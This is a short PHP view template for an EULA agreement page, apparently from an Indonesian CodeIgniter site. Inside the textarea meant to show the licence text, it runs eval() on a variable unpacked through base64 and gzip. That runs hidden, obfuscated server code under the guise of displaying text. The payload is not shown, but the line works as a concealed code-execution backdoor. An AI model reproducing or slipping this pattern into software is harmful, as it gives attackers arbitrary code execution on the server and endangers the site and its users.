<link href="<?php echo base_url() ?>assets/css/c11f8f1b6c157a7a1ee04039d038c282336416b9.css" rel="stylesheet" type="text/css" />
<script src="<?php echo base_url(); ?>assets/js/libs/modernizr-2.0.6.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/8f71c247c4dadc837fe569208a7a1dc0f7625c46.js"></script>
<br>
<table border="0" width="600px" height="200px">
<tr>	
<td>	
<form id='validate-form' class="block-content form" action="<?php echo base_url() .'beranda/eula/'. $uid; ?>" method='post' accept-charset="utf-8" enctype="multipart/form-data">

                            <textarea rows='15' cols='200'>
							<?php eval(base64_decode(gzuncompress(base64_decode($eula)))); ?>
							</textarea>
					<div class='clear'>
                    </div>
                    <div class='block-actions'>
                        <ul class='actions-left'>
                            <li><input name="submit" type='submit' class='button' value="Setuju"></li>
                        </ul>
                    </div>
                </form>
</td>
</tr>
</table>
                    
